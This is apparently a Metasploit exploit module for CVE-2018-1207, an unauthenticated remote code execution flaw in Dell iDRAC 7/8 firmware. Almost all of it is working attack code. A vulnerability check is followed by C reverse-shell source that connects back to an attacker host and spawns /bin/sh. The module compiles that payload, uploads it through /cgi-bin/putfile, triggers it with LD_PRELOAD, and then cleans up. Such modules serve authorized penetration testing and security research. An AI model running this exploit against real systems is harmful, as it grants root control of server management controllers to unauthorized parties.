##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Dell iDRAC 7/8 Devices Code Injection Vulnerability (RCE)',
      'Description' => %q(
        CVE-2018-1207. Vulnerable version firmware: <  2.52.52.52. Unauthenticated remote code execution
        against Dell iDRAC 7 and 8, which runs as root.
      ),
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Wyatt Dahlenburg (@wdahlenb)',
          'Starev Alexey ( https://t.me/starev_aa ), http://kraud.ru'
        ],
      'DisclosureDate' => '2018-09-06',
      'Platform' => 'linux',
      'DefaultOptions' => { 'Payload' => 'generic/shell_reverse_tcp' },
      'SessionTypes' => [ 'shell' ],
      'Targets' => [['Auto', {}]],
      'References' =>
        [
          ['URL', 'https://github.com/KraudSecurity/Exploits/blob/master/CVE-2018-1207/CVE-2018-1207.py'],
          ['URL', 'https://www.immunityinc.com/downloads/The-Unbearable-Lightness-of-BMC-wp.pdf'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2018-1207'],
          ['CVE', '2018-1207']
        ],
      'DefaultTarget' => 0))
    register_options [
      OptInt.new("TIMEOUT", [false, 'Override default timeout for reqeusts', 15]),
    ]
    register_advanced_options [
      OptBool.new('ForceExploit', [false, 'Override check result', false]),
    ]
  end

  def write_payload(file, lhost, lport)
    vprint_status "Writing #{file.path}"
    data = <<~EOF
      #include <stdlib.h>
      #include <unistd.h>
      #include <sys/socket.h>
      #include <netinet/in.h>
      #include <arpa/inet.h>
      #include <unistd.h>
      static void main(void) __attribute__((constructor));
      static void main(void)
      {
        int pid = fork();
        if(!pid) {
          int sock = socket(AF_INET, SOCK_STREAM, 0);
          struct sockaddr_in serv_addr = {0};
          serv_addr.sin_family = AF_INET;
          serv_addr.sin_port = htons(#{lport});
          serv_addr.sin_addr.s_addr = inet_addr("#{lhost}");
          connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
          dup2(sock, 0);
          dup2(sock, 1);
          dup2(sock, 2);
          execl("/bin/sh", "/bin/sh", NULL);
        }
      }
    EOF
    file.puts data
  end

  def compile(source_path, payload_path, gcc_args = '')
    gcc_cmd = "sh4-linux-gnu-gcc-8 -shared -fPIC #{source_path} -o #{payload_path}"

    unless gcc_args.to_s.blank?
      gcc_cmd << " #{gcc_args}"
    end

    if `dpkg --get-selections | grep ^gcc-8-sh4-linux-gnu`.blank?
      fail_with Failure::BadConfig, 'gcc-8-sh4-linux-gnu is not installed. Unable to compile.'
    end

    output = `#{gcc_cmd}`

    if output.blank?
      vprint_status "Compiled #{payload_path}"
    else
      vprint_status output
    end

  end

  def check
    uri = '/cgi-bin/login'
    print_status("Sending request to https://#{rhost}#{uri}")
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => uri,
        'vars_get' => {
          'LD_DEBUG' => 'files'
        }
      },
      datastore['TIMEOUT']
    )

    if res && res.body.to_s =~ /calling init:/
      print_status('Valid response received...')
      return CheckCode::Vulnerable
    elsif res && res.code != 200
      return CheckCode::Safe
    elsif res
      print_error("Unexpected reply from the target: #{res.code} #{res.message} #{res.body}")
    else
      print_error('No reply received from the target')
    end
    return CheckCode::Unknown
  end

  def exploit
    unless check
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    # Write payload to temp file
    temp_file = Rex::Quickfile.new(['', '.c'])
    write_payload(temp_file, datastore['LHOST'], datastore['LPORT'])
    temp_file.close

    # Compile payload to temp library
    payload_file = Rex::Quickfile.new(['', '.so'])
    compile(temp_file.path, payload_file.path)

    payload_so = File.read payload_file.path

    f_alias = 'RACPKSSHAUTHKEY1'
    payload = f_alias + ['00' * (32 - f_alias.size)].pack('h*')
    payload += [payload_so.size].pack('V*')
    vprint_status "Length of payload is #{payload_so.size}"
    payload += ['1'].pack('h8')
    payload += payload_so

    # Upload payload
    uri = '/cgi-bin/putfile'
    print_status("Sending request for https://#{rhost}#{uri}")
    res = send_request_raw(
      {
        'method' => 'POST',
        'uri' => uri,
        'data' => payload
      },
      datastore['TIMEOUT']
    )

    if res && res.code == 200
      print_status "#{rhost} - Exploit Upload Success"

      send_request_cgi(
        {
          'method' => 'GET',
          'uri' => '/cgi-bin/discover',
          'vars_get' => {
            'LD_PRELOAD' => '/tmp/sshpkauthupload.tmp'
          }
        },
        datastore['TIMEOUT']
      )
      vprint_status "#{rhost} - Triggering reverse shell"
    else
      print_error "#{rhost} - Error Upload Failed"
    end

    handler
  end

  def on_new_session(session)
    # Remove /tmp/sshpkauthupload.tmp and make sure LD_PRELOAD is unset
    session.shell_command_token 'rm -f /tmp/sshpkauthupload.tmp'
    session.shell_command_token 'unset LD_PRELOAD'
  end
end
